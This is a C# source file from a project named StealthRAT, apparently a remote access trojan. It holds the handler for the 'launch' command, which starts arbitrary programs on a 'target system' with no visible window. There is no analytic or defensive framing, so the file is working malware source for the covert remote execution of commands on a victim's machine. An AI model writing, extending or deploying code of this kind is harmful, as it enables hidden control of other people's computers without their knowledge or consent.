using System.Diagnostics;
using StealthRAT.Interfaces;

namespace StealthRAT.Handlers;

/// <summary>
/// Handles the "launch" command to start external processes on the target system.
/// Validates input parameters and starts processes without creating visible windows.
/// </summary>
public sealed class LaunchProcessHandler : ICommandHandler
{
    /// <inheritdoc/>
    public string CommandName => "launch";

    /// <inheritdoc/>
    public Task<string> ExecuteAsync(string[] args, CommandContext context)
    {
        if (args.Length == 0)
        {
            return Task.FromResult("ERR: Missing program name. Usage: launch <program> [arguments]");
        }

        string programName = args[0];
        string arguments = args.Length > 1 ? string.Join(" ", args.Skip(1)) : string.Empty;

        try
        {
            var startInfo = new ProcessStartInfo
            {
                FileName = programName,
                Arguments = arguments,
                UseShellExecute = false,
                CreateNoWindow = true,
                RedirectStandardError = true
            };

            Process? process = Process.Start(startInfo);
            if (process != null)
            {
                return Task.FromResult($"OK: Launched '{programName}' (PID: {process.Id})");
            }

            return Task.FromResult($"ERR: Failed to start '{programName}' - process returned null");
        }
        catch (System.ComponentModel.Win32Exception ex)
        {
            return Task.FromResult($"ERR: Cannot launch '{programName}' - {ex.Message}");
        }
        catch (Exception ex)
        {
            return Task.FromResult($"ERR: Unexpected error launching '{programName}' - {ex.Message}");
        }
    }
}
